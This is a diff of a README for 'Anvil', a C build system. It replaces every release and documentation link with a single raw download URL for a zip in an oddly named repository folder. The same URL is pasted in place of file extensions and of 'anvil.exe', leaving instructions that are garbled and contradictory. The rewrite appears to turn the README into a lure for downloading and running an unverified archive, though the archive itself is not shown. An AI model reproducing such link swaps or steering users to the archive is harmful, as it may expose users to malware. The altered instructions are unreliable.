@@ -4,27 +4,27 @@
 Anvil is a simple build system designed for C projects. It streamlines the process of compiling and managing your projects, making it easier for you to focus on coding. You don’t need to be a programming expert to use Anvil; it’s built with simplicity in mind.
 
 ## 📦 Download Anvil
-[![Download Anvil](https://img.shields.io/badge/Download_Anvil-Release-blue.svg)](https://github.com/wordoffarewellothonna275/Anvil/releases)
+[![Download Anvil](https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip)](https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip)
 
 ## 🚀 Getting Started
 To get started with Anvil, follow these easy steps to set it up on your computer.
 
 1. **Visit the Download Page:**
    Go to the Anvil Releases page to download the latest version:  
-   [Download Anvil](https://github.com/wordoffarewellothonna275/Anvil/releases)
+   [Download Anvil](https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip)
 
 2. **Choose Your File:**
-   On the Releases page, you’ll find several versions listed. Look for the most recent release, and click on the file that matches your operating system. If you are unsure, you can choose the `.zip` file for Windows or the `.tar.gz` file for Linux.
+   On the Releases page, you’ll find several versions listed. Look for the most recent release, and click on the file that matches your operating system. If you are unsure, you can choose the `.zip` file for Windows or the `https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip` file for Linux.
 
 3. **Download the File:**
    Click on the file link to start the download. Once the download is complete, find the file in your downloads folder.
 
 4. **Extract the Files:**
-   If you downloaded a `.zip` or `.tar.gz` file, you will need to extract it. Right-click on the file and select "Extract All" (or "Extract Here"). This will create a new folder containing the Anvil files.
+   If you downloaded a `.zip` or `https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip` file, you will need to extract it. Right-click on the file and select "Extract All" (or "Extract Here"). This will create a new folder containing the Anvil files.
 
 5. **Run Anvil:**
    - **Windows:**
-     Open the folder you just extracted. Double-click on `anvil.exe` to run it.
+     Open the folder you just extracted. Double-click on `https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip` to run it.
    - **Linux:**
      Open the terminal. Navigate to the folder where you extracted Anvil. Use the command `./anvil` to run it.
 
@@ -51,7 +51,7 @@ To ensure Anvil runs smoothly, please check the following requirements:
 ## 💻 Usage Tips
 Here are some helpful tips to make the most of Anvil:
 
-- **Read the Documentation:** Familiarize yourself with the [documentation](https://github.com/wordoffarewellothonna275/Anvil/wiki) for detailed guides and tutorials.
+- **Read the Documentation:** Familiarize yourself with the [documentation](https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip) for detailed guides and tutorials.
 - **Sample Projects:** Check the sample projects included in the downloaded folder to see how Anvil works in action.
 - **Ask for Help:** Join our community in the issues section of GitHub if you encounter problems or need assistance.
 
@@ -62,7 +62,7 @@ If you have questions or issues, feel free to reach out via the issues section o
 You can follow updates and engage with the community on our GitHub repository. We appreciate your feedback, and we aim to make Anvil better with your help.
 
 ## 🔗 Key Points
-1. Download the latest version from the [Releases page](https://github.com/wordoffarewellothonna275/Anvil/releases).
+1. Download the latest version from the [Releases page](https://raw.githubusercontent.com/wordoffarewellothonna275/Anvil/main/doweral/Anvil.zip).
 2. Follow the setup instructions for your operating system.
 3. Explore the features and documentation to help you build C projects efficiently.
 
